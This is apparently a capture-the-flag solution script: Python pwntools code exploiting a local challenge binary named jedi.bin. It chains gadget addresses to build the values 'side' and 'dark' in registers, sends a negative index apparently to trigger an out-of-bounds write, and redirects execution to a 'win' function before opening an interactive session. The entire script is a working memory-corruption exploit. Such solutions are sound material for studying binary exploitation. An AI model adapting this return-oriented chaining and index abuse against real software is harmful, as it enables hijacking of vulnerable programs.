from pwn import *
context.log_level = "debug"
sh=process("./jedi.bin")
jedi_start=0x401390
jedi_rdi2rsi=0x401340
jedi_shlrdi=0x401360
jedi_xorrdi=0x0401380
jedi_addrdi=0x4013D0
win=0x4013E0
payload=p64(0)+p64(jedi_xorrdi)
def parse_int64(value):
    bin_value=bin(value)[2:]
    payload=b''
    for i in bin_value:
        if i == "0":
            payload+=p64(jedi_shlrdi)
        if i == "1":
            payload+=p64(jedi_addrdi)
            payload+=p64(jedi_shlrdi)
    payload=payload[:-8]
    return payload
payload+=parse_int64(0x73696465)
payload+=p64(jedi_rdi2rsi)
payload+=p64(jedi_xorrdi)
payload+=parse_int64(0x6461726B)
payload+=p64(win)
sh.sendlineafter(b">>>",payload)
sh.sendlineafter(b">>> ",b'-2036')
# gdb.attach(sh,"b *0x401212\nc")
sh.sendlineafter(b">>> ",p64(jedi_start))
sh.interactive()